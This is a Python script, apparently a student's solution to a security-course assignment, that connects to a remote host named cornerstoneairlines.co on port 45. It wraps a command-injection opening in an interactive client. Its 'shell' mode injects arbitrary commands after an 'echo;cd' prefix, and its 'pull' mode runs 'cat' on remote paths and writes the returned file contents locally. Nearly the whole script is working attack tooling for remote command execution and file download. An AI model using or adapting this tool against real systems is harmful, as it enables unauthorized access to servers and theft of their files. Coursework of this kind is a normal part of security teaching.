"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time
import os.path

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd,cur_dir):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    time.sleep(2)
    data = s.recv(1024)
    new_dir = cur_dir

    if ('cd' in cmd):
        cmd_args = cmd.split(" ")
        if(not(cmd_args[1] == "..")):
            if(cur_dir == "/"):
                new_dir = cur_dir+cmd_args[1]
            else:
                new_dir = cur_dir+"/"+cmd_args[1]
        else:
            dirs = (cur_dir.split("/"))
            dirs.pop()
            if(cur_dir.count('/')== 1):
                new_dir = "/"+("/".join(dirs))
            else:
                new_dir = ("/".join(dirs))


    s.send(bytes("echo;cd "+cur_dir+"; "+cmd+"\n",'utf-8'))
    time.sleep(2)
    data = s.recv(1024)
    print(data.decode('utf-8'))
    return new_dir

if __name__ == '__main__':
    prompt = ">"
    while(True):
        #Receive User Input
        user_input = input(prompt)
        #Check if it is a shell
        if(user_input == "shell"):
            #ENTER SHELL HERE
            
            cur_dir = '/'
            
            while(True):
                shell_input = input(cur_dir+">")
                if(shell_input == "exit" or shell_input == "quit"):
                    break;
                else:
                    cur_dir = execute_cmd(shell_input,cur_dir)
            prompt = ">"
        elif("pull" in user_input):
            #EXECUTE PULL HERE 
            remote_path = user_input.split(" ")[1]
            local_path = user_input.split(" ")[2]
            
            #Print out file to the screen and copy it into a text file at specified location
            file_obj = open(local_path,"w+")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            time.sleep(2)
            data = s.recv(1024)
            s.send(bytes("echo; cat "+remote_path+"\n",'utf-8'))
            time.sleep(2)
            data = s.recv(1024)
            
            while(data):
                file_obj.write(data.decode('utf-8'))
                data = s.recv(1024)
            file_obj.close()
            #Check if it is a help
        elif(user_input == "help"):
            print("Type shell Drop into an interactive shell\nType pull <remote-path> <local-path> to Download files\nType help to show this help menu\nType quit Quit the shell")
            #Check if it is a quit
        elif(user_input == "quit"):
            break
        else:
            print("Command Not Found. Enter help to see available commands")